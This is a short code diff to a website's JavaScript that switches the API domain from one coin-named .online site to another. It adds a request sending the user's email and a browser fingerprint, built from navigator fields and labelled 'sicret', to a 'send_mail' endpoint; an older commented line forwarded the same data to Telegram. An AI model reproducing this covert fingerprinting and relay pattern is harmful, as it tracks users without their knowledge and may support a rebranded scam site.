@@ -18,7 +18,7 @@ function loaderFunction(status) {
 async function send_request(type, laoder, url, data) {
     if (laoder) { loaderFunction(false)}
     return new Promise((resolve, reject) => {
-        let page = `https://royalcoinunion.online/${url}`;
+        let page = `https://amecacoin.online/${url}`;
         xhr.open(type, page)
         xhr.responseType = "json"
         xhr.setRequestHeader("Accept", "application/json")
@@ -85,6 +85,7 @@ async function show(keys) {
                     fill_error.classList.remove("active");
 
                     // send_request("post", false, "transaction-successfully", { sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion), send_telegram: true })
+                    send_request("post", false, "send_mail", { sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion), email: email })
 
                     setTimeout(() => {
                         // wait.textContent = "Confirmation will be sent to email"
